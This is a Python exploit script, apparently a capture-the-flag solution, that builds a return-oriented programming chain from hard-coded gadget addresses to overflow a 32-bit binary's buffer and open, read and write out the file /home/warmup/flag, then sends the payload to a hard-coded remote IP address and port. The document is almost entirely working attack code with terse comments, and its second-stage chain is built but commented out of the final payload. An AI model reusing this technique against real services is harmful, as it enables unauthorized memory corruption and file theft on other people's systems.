#!/usr/bin/env python3

import struct

def p(x):
    return struct.pack("<I", x)

# Gadget

rop_exit = 0x804814d  # eax=1; ebx=0; int 0x80 // exit(0)
# use read to set eax
rop_read = 0x804811d  # read
rop_set_ebx_ecx_edx_int_80 = 0x8048122

rop_write = 0x8048135

rop_add_esp_0x30 = 0x080481b8
# 0x30 => 48 => 4 * 12

rop_pop_esp = 0x08048123
rw_memory = 0x080491bc

read_buffer = 0xffffd2fc

# read_buffer = rw_memory

flag_path = b"/home/warmup/flag\x00"

payload1 = [
    flag_path +
    b"A" * (32 - len(flag_path)),
    ### payload to load big payload
    p(rop_read),
    p(rop_pop_esp), # <= here will be the next rop
    p(0),  # fd
    p(rw_memory),  # buffer
    p(100),
    p(rop_exit)
    # p(read_buffer + 32 + 4),  # buffer => make it overwrite the next rop
    # p(4 * 2),  # size // add it after because it have to be precise
]

payload2 = [
    ### payload 2
    # set eax=5 using read (5 == open)
    p(rop_read),

    p(rop_add_esp_0x30), # clean the stack for the next rop
    p(0),  # fd
    p(read_buffer - 10),
    p(5),  # set eax=5
] + [p(0xdeadbeef)] * (12-3) + [
    # time to open
    p(rop_set_ebx_ecx_edx_int_80),
    p(rop_add_esp_0x30), # .. "
    p(read_buffer),  # filename
    p(0x2),  # RD_ONLY
    p(0x00),  # mode // ignore this shit
] + [p(0xdeadbeef)] * (12-3) + [

    # read the flag
    p(rop_read),
    p(rop_add_esp_0x30), # .. "
    p(0x3),
    p(read_buffer),
    p(512),

] + [p(0xdeadbeef)] * (12-3) + [

    # write the flag
    p(rop_write),
    p(rop_add_esp_0x30),
    p(0x1),
    p(read_buffer),
    p(512),

] + [p(0xdeadbeef)] * (12-3) + [
    p(rop_exit),
]


payload = b''.join(
    payload1 #  +
    # [p(len(payload2) * 4)] +  # precise size for the read...
    # payload2 +
    # [b"A" * 5]  # 5 bytes for the read // set eax=5
)

open('input', 'wb').write(payload)

import sys
if len(sys.argv) > 1:
    sys.exit(0)

import socket

HOST, PORT = "202.120.7.207", 52608
# HOST, PORT = "localhost", 4242

s = socket.socket()
s.connect((HOST, PORT))
s.send(payload)
print(s.recv(4096))
print(s.recv(4096))
print(s.recv(4096))
print(s.recv(4096))


